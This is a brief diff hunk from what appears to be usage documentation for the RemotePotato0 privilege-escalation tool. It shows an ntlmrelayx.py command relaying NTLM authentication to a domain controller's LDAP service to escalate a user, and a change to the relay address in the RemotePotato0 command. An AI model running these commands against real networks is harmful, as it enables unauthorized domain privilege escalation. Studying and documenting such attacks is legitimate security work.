@@ -23,7 +23,7 @@ sudo ntlmrelayx.py -t ldap://10.0.0.10 --escalate-user winrm_user --no-wcf-serve
 Victim machine (10.0.0.20):
 
 ```
-.\RemotePotato0.exe -r 10.0.0.20 -p 1111
+.\RemotePotato0.exe -r 10.0.0.11 -p 1111
 ```
 
 Victim Domain Controller (10.0.0.10)
